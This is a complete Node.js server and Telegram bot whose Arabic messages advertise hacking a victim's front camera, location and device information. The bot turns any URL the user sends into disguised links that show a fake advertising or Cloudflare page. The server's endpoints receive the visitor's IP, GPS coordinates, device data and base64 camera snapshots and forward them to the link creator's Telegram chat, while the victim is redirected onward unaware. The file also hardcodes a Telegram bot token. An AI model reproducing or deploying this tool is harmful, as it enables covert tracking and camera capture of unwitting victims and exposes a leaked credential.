const path = require("path"); 

const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

const bot = new TelegramBot("6883235838:AAHR6tUDFyYTj2u-5EV_yCWTA1_GSZtjiao", { polling: true });
var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();

app.set("views", path.join(__dirname, "views")); 
app.set("view engine", "ejs");

app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());

//Modify your URL here
var hostURL = 'https://5000-almunharifhamoud-km-h8zhjm99tby.ws-us110.gitpod.io';
//TOGGLE for Shorters
var use1pt = false;



app.get("/w/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 200000).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }

  if (req.params.path != null) {
    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  }
  else {
    res.redirect("https://t.me/hqooosjjd");
  }



});

app.get("/c/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }


  if (req.params.path != null) {
    res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  }
  else {
    res.redirect("https://t.me/hqooosjjd");
  }



});



bot.on('message', async (msg) => {
  const chatId = msg.chat.id;



  if (msg?.reply_to_message?.text == "اكتب الرابط🔎؟") {
    createLink(chatId, msg.text);
  }

  if (msg.text == "/start") {
    var m = {
      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "تلغيم رابط🔎! ", callback_data: "crenew" }]] })
    };

    bot.sendMessage(chatId, `اهلابك👨‍💻⚠️ ${msg.chat.first_name} ! , \ في بوت المنحرف إختراق الكاميرا الاماميه وموقع الضحيه وبعض المعلومات الحاسسه في جهاز الضحية🥷🏾✅
    للإبلاغ عن مستخدم غير اخلاقي تواصل مع
    المنحرف👨‍💻( @VlP_12 ) s.\n\nارسل /help لمعرفة المزيد عن البوت.`, m);
  }
  else if (msg.text == "/create") {
    createNew(chatId);
  }
  else if (msg.text == "/help") {
    bot.sendMessage(chatId, ` هلاب بك في بوت المنحرف  إختراق الكاميرا الاماميه وموقع الضحيه وبعض المعلومات الحاسسه في جهاز  الضحية👨‍💻⚠️

لكتابة رابط ارسل. /create


طبعا تقوم في ارسال للبوت اي رابط وسوف يقوم البوت في تلغيم الربط ملاحظة سوف يتم اظهار صفحة اعلانيه عندما يدخل الضحيه الرابط ومن ثم يتم توجهة الي الرابط الذي قمت في كتابته توضيح عندما تقوم في اخذ اي رابط فيديو او حساب وقمت في ارساله للبوت سوف يتم تلغيمه وعندما تقوم في ارساله لضحيه يظهر لديه صفحه اعلانيه ومن ثم توجههة الي الرابط الحقيقي دون اي يعرف⚠️


🔰الرجاء من مستخدمين البوت عدم اسخدمه في الابتزاز  او التهديد او ايشي يغضب الله  لاتنسي "إن الله بما تعملون بصير" 


مطور البوت المنحرف. @VlP_12


قناتي الرسميه لتحديثات والجميع مطلبات الهاكر

@hqooosjjd


"إن الله بما تعملون بصير"
`);
  }


});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});
bot.on('polling_error', (error) => {
  //console.log(error.code); 
});






async function createLink(cid, msg) {

  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {

    var url = cid.toString(36) + '/' + btoa(msg);
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "تلغيم رابط🔎؟", callback_data: "crenew" }]]
      })
    };

    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;

    bot.sendChatAction(cid, "typing");
    if (use1pt) {
      var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
      var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

      var f = "", g = "";

      for (var c in x) {
        f += x[c] + "\n";
      }

      for (var c in y) {
        g += y[c] + "\n";
      }

      bot.sendMessage(cid, `الرابط الحقيقي✅You can use any one of the below links.\nURL: ${msg}\n\nالروابط الي تم تلغيمها بوسطة بوت المنحرف 👇⚠️\n\n🌐 الرابط الأول \n${f}\n\n🌐 الرابط الثاني\n${g}`, m);
    }
    else {

      bot.sendMessage(cid, `الرابط الحقيقي✅\nURL: ${msg}\n\nالروابط الي تم تلغيمها بوسطة بوت المنحرف 👇⚠️\n\n🌐 الرابط الأول \n${cUrl}\n\n🌐 الرابط الثاني\n${wUrl}`,m);
    }
  }
  else {
    bot.sendMessage(cid, `الرابط خطاء يرجي كتابة الرابط بشكل صحيح؟⚠️.`);
    createNew(cid);

  }
}


function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(cid, `اكتب الرابط🔎؟`, mk);
}





app.get("/", (req, res) => {
  var ip;
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
  res.json({ "ip": ip });


});


app.post("/location", (req, res) => {


  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {

    bot.sendLocation(parseInt(uid, 36), lat, lon);

    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);

    res.send("Done");
  }
});


app.post("/", (req, res) => {

  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) {


    data = data.replaceAll("<br>", "\n");

    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });


    res.send("Done");
  }
});


app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;

  if (uid != null && img != null) {

    var buffer = Buffer.from(img, 'base64');

    var info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };


    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    } catch (error) {
      console.log(error);
    }


    res.send("Done");

  }

});



app.listen(5000, () => {
  console.log("App Running on Port 5000!");
});
